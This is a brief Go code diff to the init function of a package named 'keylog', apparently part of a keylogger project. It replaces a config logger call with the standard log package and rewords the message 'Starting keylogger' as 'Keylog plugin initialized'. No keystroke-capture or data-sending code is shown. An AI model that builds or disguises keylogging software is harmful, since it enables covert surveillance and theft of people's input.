@@ -1,11 +1,8 @@
 package keylog
 
-import (
-	"watsap/utils/config"
-)
+import "log"
 
 func InitKeylog() {
-	config.Logger("[Keylog] Starting keylogger", "info")
+	log.Println("Keylog plugin initialized")
 	InitKeyboard()
-
 }
